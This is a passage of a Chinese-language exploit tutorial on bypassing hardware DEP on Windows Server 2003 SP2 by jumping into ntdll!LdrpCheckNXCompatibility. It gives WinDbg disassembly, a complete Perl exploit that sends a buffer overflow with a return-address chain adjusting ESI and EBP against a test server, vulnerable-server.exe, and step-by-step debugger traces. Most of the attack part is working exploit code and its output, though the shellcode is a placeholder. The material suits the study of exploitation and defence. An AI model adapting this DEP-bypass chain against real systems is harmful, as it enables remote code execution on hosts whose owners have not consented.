close SOCKET or die "close: $!";
system('telnet '.$host.' 5555');
注意，即使DEP没被启用，这个exploit依然可以正常运行。
关闭 HHHHWWWWDDDDEEEEPPPP((((WWWWiiiinnnnddddoooowwwwssss2222000000003333 SSSSPPPP2222)))):::: 演示
在windows 2003 sp2中增加了额外的检查（比较AL和EBP，EBP和ESI）,这就要求我们稍微修改一下我
们的技术，为了能完成这个任务，我们需要让ebp和esi都指向可写的地址。
在Windows 2003 server standard R2 SP2系统上，ntdll!LdrpCheckNXCompatibility是这样的：
0:000> uf ntdll!LdrpCheckNXCompatibility
ntdll!LdrpCheckNXCompatibility:
7c8343b4 8bff mov edi,edi
7c8343b6 55 push ebp
7c8343b7 8bec mov ebp,esp
7c8343b9 51 push ecx
7c8343ba 833db4a9887c00 cmp dword ptr [ntdll!Kernel32BaseQueryModuleData (7c88a9b4)],0
7c8343c1 7441 je ntdll!LdrpCheckNXCompatibility+0x5f (7c834404)
ntdll!LdrpCheckNXCompatibility+0xf:
7c8343c3 8365fc00 and dword ptr [ebp-4],0
7c8343c7 56 push esi
7c8343c8 8b7508 mov esi,dword ptr [ebp+8]
7c8343cb 56 push esi
7c8343cc e899510000 call ntdll!LdrpCheckSafeDiscDll (7c83956a)
7c8343d1 3c01 cmp al,1
7c8343d3 0f846eb10000 je ntdll!LdrpCheckNXCompatibility+0x2b (7c83f547)
ntdll!LdrpCheckNXCompatibility+0x21:
7c8343d9 56 push esi
7c8343da e8e4520000 call ntdll!LdrpCheckAppDatabase (7c8396c3)
7c8343df 84c0 test al,al
7c8343e1 0f8560b10000 jne ntdll!LdrpCheckNXCompatibility+0x2b (7c83f547)
ntdll!LdrpCheckNXCompatibility+0x34:
7c8343e7 56 push esi
7c8343e8 e8e4510000 call ntdll!LdrpCheckNxIncompatibleDllSection (7c8395d1)
7c8343ed 84c0 test al,al
7c8343ef 0f85272c0100 jne ntdll!LdrpCheckNXCompatibility+0x3e (7c84701c)
ntdll!LdrpCheckNXCompatibility+0x45:
7c8343f5 837dfc00 cmp dword ptr [ebp-4],0
7c8343f9 0f854fb10000 jne ntdll!LdrpCheckNXCompatibility+0x4b (7c83f54e)
ntdll!LdrpCheckNXCompatibility+0x5a:
7c8343ff 804e3780 or byte ptr [esi+37h],80h
7c834403 5e pop esi
ntdll!LdrpCheckNXCompatibility+0x5f:
7c834404 c9 leave
7c834405 c20400 ret 4
ntdll!LdrpCheckNXCompatibility+0x2b:
7c83f547 c745fc02000000 mov dword ptr [ebp-4],offset +0x1 (00000002)
ntdll!LdrpCheckNXCompatibility+0x4b:
7c83f54e 6a04 push 4
7c83f550 8d45fc lea eax,[ebp-4]
7c83f553 50 push eax
7c83f554 6a22 push 22h
7c83f556 6aff push 0FFFFFFFFh
7c83f558 e80085feff call ntdll!ZwSetInformationProcess (7c827a5d)
7c83f55d e99d4effff jmp ntdll!LdrpCheckNXCompatibility+0x5a (7c8343ff)
ntdll!LdrpCheckNXCompatibility+0x3e:
7c84701c c745fc02000000 mov dword ptr [ebp-4],offset +0x1 (00000002)
7c847023 e9cdd3feff jmp ntdll!LdrpCheckNXCompatibility+0x45 (7c8343f5)
比较[ebp-4]是否为0，一个跳转跳到7c83f54e，接着就调用了ZwSetInformationProcess。
ntdll!LdrpCheckNXCompatibility+0x4b:
7c83f54e 6a04 push 4
7c83f550 8d45fc lea eax,[ebp-4]
7c83f553 50 push eax
7c83f554 6a22 push 22h
7c83f556 6aff push 0FFFFFFFFh
7c83f558 e80085feff call ntdll!ZwSetInformationProcess (7c827a5d)
7c83f55d e99d4effff jmp ntdll!LdrpCheckNXCompatibility+0x5a (7c8343ff)
7c83f562 0fb6fd movzx edi,ch
0:000> u 7c827a5d
ntdll!ZwSetInformationProcess:
7c827a5d b8ed000000 mov eax,0EDh
7c827a62 ba0003fe7f mov edx,offset SharedUserData!SystemCallStub (7ffe0300)
7c827a67 ff12 call dword ptr [edx]
7c827a69 c21000 ret 10h
7c827a6c 90 nop
ntdll!NtSetInformationThread:
7c827a6d b8ee000000 mov eax,0EEh
7c827a72 ba0003fe7f mov edx,offset SharedUserData!SystemCallStub (7ffe0300)
7c827a77 ff12 call dword ptr [edx]
执行完这个例程，它返回到调用函数并执行到0×7c8343ff。
ntdll!LdrpCheckNXCompatibility+0x5a:
7c8343ff 804e3780 or byte ptr [esi+37h],80h
7c834403 5e pop esi
ntdll!LdrpCheckNXCompatibility+0x5f:
7c834404 c9 leave
7c834405 c20400 ret 4
这里esi被引用并弹出esi,接着就到达了函数的结尾。
我们已经知道如何调整ebp(让它指向可写的内存)，现在我们需要对ESI做相同的调整，重要的是我们要
观察每条指令并监视寄存器的内容，我们注意到当程序运行时，不管在ESI中放入什么值，程序都会跳转
到ESI中去执行。
让我们观察下边的exploit做了些什么，它使用下边的两个地址来调整esi和ebp。
- 0×71c0db30 : adjust ESI (push esp, pop esi, ret)
- 0×77c177f8 : adjust EBP (push esp, pop ebp, ret)
use strict;
use Socket;
my $junk = "A" x 508;
my $disabledep = pack('V',0x71c0db30); #adjust esi
$disabledep = $disabledep.pack('V',0x77c177f8); # adjust ebp
$disabledep = $disabledep.pack('V',0x7c86311d); #set eax to 1
$disabledep= $disabledep."FFFF"; #4 bytes padding
$disabledep = $disabledep.pack('V',0x7c8343f5); #run NX Disable routine
$disabledep = $disabledep."FFFF"; #4 more bytes padding
$disabledep = $disabledep.pack('V',0x773ebdff); #jmp esp (user32.dll)
my $nops = "\x90" x 30;
my $shellcode="\xcc" x 700;
# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');
# get the port address
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);
print "[+] Setting up socket\n";
# create the socket, connect to the port
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
my $payload = $junk.$disabledep.$nops.$shellcode."\n";
print SOCKET $payload."\n";
print "[+] Payload sent, ".length($payload)." bytes\n";
close SOCKET or die "close: $!";
system('telnet '.$host.' 5555');
用windbg启动vulnsrv.exe，在0×7c8343f5上设置断点（该地址是用于禁用NX的例程），然后运行这
个程序，并运行exploit攻击这个程序，看看发生了什么:
断点被断下来
Breakpoint 0 hit
eax=0012e701 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c8343f5 esp=0012e274 ebp=0012e268 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
ntdll!LdrpCheckNXCompatibility+0x45:
7c8343f5 837dfc00 cmp dword ptr [ebp-4],0 ss:0023:0012e264=0012e268
寄存器：esi和ebp都指向堆栈的附近，eax的低位已被置1，所以指令“mov eax,1”被执行了。
接着用命令t进行跟踪步入：
0:000> t
eax=0012e701 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c8343f9 esp=0012e274 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!LdrpCheckNXCompatibility+0x49:
7c8343f9 0f854fb10000 jne ntdll!LdrpCheckNXCompatibility+0x4b (7c83f54e) [br=1]
0:000> t
eax=0012e701 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c83f54e esp=0012e274 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!LdrpCheckNXCompatibility+0x4b:
7c83f54e 6a04 push 4
0:000> t
eax=0012e701 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c83f550 esp=0012e270 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!LdrpCheckNXCompatibility+0x4d:
7c83f550 8d45fc lea eax,[ebp-4]
0:000> t
eax=0012e264 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c83f553 esp=0012e270 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!LdrpCheckNXCompatibility+0x50:
7c83f553 50 push eax
0:000> t
eax=0012e264 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c83f554 esp=0012e26c ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!LdrpCheckNXCompatibility+0x51:
7c83f554 6a22 push 22h
0:000> t
eax=0012e264 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c83f556 esp=0012e268 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!LdrpCheckNXCompatibility+0x53:
7c83f556 6aff push 0FFFFFFFFh
0:000> t
eax=0012e264 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c83f558 esp=0012e264 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!LdrpCheckNXCompatibility+0x55:
7c83f558 e80085feff call ntdll!ZwSetInformationProcess (7c827a5d)
0:000> t
eax=0012e264 ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c827a5d esp=0012e260 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!ZwSetInformationProcess:
7c827a5d b8ed000000 mov eax,0EDh
0:000> t
eax=000000ed ebx=00000000 ecx=0012e559 edx=0012e700 esi=0012e264 edi=00403388
eip=7c827a62 esp=0012e260 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!NtSetInformationProcess+0x5:
7c827a62 ba0003fe7f mov edx,offset SharedUserData!SystemCallStub (7ffe0300)
0:000> t
eax=000000ed ebx=00000000 ecx=0012e559 edx=7ffe0300 esi=0012e264 edi=00403388
eip=7c827a67 esp=0012e260 ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!NtSetInformationProcess+0xa:
7c827a67 ff12 call dword ptr [edx]
ds:0023:7ffe0300={ntdll!KiFastSystemCall (7c828608)}
0:000> t
eax=000000ed ebx=00000000 ecx=0012e559 edx=7ffe0300 esi=0012e264 edi=00403388
eip=7c828608 esp=0012e25c ebp=0012e268 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202